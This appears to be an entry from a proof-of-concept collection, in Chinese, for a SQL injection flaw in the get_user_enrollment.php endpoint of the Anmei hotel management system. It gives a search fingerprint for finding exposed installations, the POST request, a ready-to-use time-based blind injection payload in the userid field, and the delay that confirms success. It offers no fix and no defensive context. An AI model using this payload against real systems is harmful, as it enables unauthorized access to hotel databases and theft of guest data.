# 安美酒店管理系统get_user_enrollment.php接口sql注入

安美酒店管理系统get_user_enrollment.php接口 ｜ SQL注入 ｜ —
- **指纹**：`title="酒店宽带运营系统"`
- **请求**：`POST /user/get_user_enrollment.php HTTP/1.1`

**Payload**
```
userid=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&usermac=1&portaltype=&portalname=
```
- **响应特征**：200 响应时间>=3s